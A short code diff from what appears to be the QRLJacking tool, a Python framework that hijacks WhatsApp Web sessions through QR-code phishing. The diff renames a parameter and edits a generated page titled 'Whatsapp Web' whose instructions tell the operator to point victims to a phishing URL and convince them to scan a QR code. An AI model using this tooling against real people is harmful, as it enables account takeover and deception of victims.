@@ -366,8 +366,8 @@ def Yelophone():
 		except:
 			break
 
-def make( service_name , port , typ="html" ):
-	if typ == "html":
+def make( service_name , port , type="html" ):
+	if type == "html":
 		code = """<html>
 <head>
 <title>Whatsapp Web</title>
@@ -385,12 +385,12 @@ Now you have a local webserver hosting your QRLJacking payload, Here's some inst
 0. This is your *always updated """+str(service_name)+""" QR Code*
 <img id="qrcodew" alt="Scan me!" src="tmp.png" style="display: block;">
 1. Edit me by adding your phishing page source code, style, resources, etc.. ( I'm the "Index.html" resides in the framework folder)
-2. Point your victim to <a href='http://Your_IP:'"""+str(port)+""" >Your final url</a>, Convince to scan the QR code and Bob is your uncle!
+2. Point your victim to your phishing <a href='http://localhost:'"""+str(port)+""" >URL</a>, Convince to scan the QR code and Bob is your uncle!
 </center>
 </body>
 </html>"""
 
-	if typ == "svg":
+	if type == "svg":
 		code = """<html>
 <head>
 <title>Whatsapp Web</title>
@@ -408,7 +408,7 @@ Now you have a local webserver hosting your QRLJacking payload, Here's some inst
 0. This is your *always updated """+str(service_name)+""" QR Code*
 <img id="qrcodew" alt="Scan me!" src="tmp.svg" style="display: block;">
 1. Edit me by adding your phishing page source code, style, resources, etc.. ( I'm the "Index.html" resides in the framework folder)
-2. Point your victim to <a href='http://Your_IP:'"""+str(port)+""" /a>, Convince to scan the QR code and Bob is your uncle!
+2. Point your victim to your phishing <a href='http://localhost:'"""+str(port)+""" >URL</a>, Convince to scan the QR code and Bob is your uncle!
 </center>
 </body>
 </html>"""
@@ -421,7 +421,7 @@ def Add_website():
 	print "  2.Find image by its number only method"
 	print "  3.Find image by the screenshot method"
 	print "  00.Back To Main Menu"
-	method = raw_input("\n  Note:Customization doesn\'t support svg images for now\n  Select method > ")
+	method = raw_input("\n  Note: Customization doesn\'t support svg images for now\n  Select method > ")
 	if method == "00":
 		main()
 
